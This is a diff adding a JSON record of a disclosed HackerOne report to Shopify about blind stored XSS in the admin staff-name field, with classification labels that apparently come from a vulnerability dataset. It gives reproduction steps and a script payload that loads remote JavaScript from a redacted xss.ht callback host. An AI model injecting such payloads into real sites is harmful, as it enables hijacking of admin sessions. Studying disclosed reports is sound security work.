@@ -1,0 +1,42 @@
+{
+    "reported_to": "Shopify",
+    "reported_by": "rioncool22 ",
+    "title": "Blind Stored XSS Via Staff Name",
+    "content": "\nHey Team, I found blind stored XSS when i add staff name in https://your-store.myshopify.com/admin/settings/account\nStep to reproduce :\nGo to https://your-store.myshopify.com/admin/settings/account\nAdd Staff Account\nFill First & Last Name with this payload \"><script>$.getScript(\"//\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.xss.ht\")</script>\nXSS will be fired in your internal web\nYou should check the DOM.html guys\nImpact\nStored XSS\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": 3000,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Stored"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1597794060,
+    "report_url": "https://hackerone.com/reports/948929",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Go to https://your-store.myshopify.com/admin/settings/account"
+        ],
+        [
+            2,
+            "Add Staff Account and fill First & Last Name with payload: \"><script>$.getScript(\"//\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.xss.ht\")</script>\""
+        ]
+    ],
+    "vuln_description": "Blind stored XSS vulnerability in the staff name field of Shopify's admin settings, allowing execution of arbitrary JavaScript when the payload is rendered in the internal web interface.",
+    "reason": "The vulnerability involves a straightforward XSS payload injection into a user-controllable field (staff name) with no complex interactions or state manipulation required. The attack surface is obvious (user input fields) and the payload is a standard XSS vector.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The vulnerability involves a stored XSS in the staff name field, which is a client-side issue and not directly related to authentication or authorization. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to this XSS vulnerability.",
+        "is_detectable": false
+    }
+}
